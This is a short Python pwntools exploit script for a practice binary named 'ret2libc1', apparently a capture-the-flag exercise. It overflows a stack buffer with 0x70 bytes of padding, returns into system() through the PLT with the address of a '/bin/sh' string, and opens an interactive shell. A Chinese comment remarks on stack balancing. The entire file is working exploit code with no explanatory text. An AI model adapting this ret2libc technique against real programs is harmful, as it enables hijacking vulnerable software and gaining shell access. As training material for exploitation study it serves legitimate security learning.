from pwn import *

io=process('./ret2libc1')
elf=ELF('./ret2libc1')


# gdb.attach(io)

# sys_addr=0x8048611
sys_addr=elf.plt['system']
bin_addr=next(elf.search(b'/bin/sh'))
payload=cyclic(0x70)+p32(sys_addr)+p32(0)+p32(bin_addr)
io.recv()
io.sendline(payload)
io.interactive()

#涉及到平衡栈的问题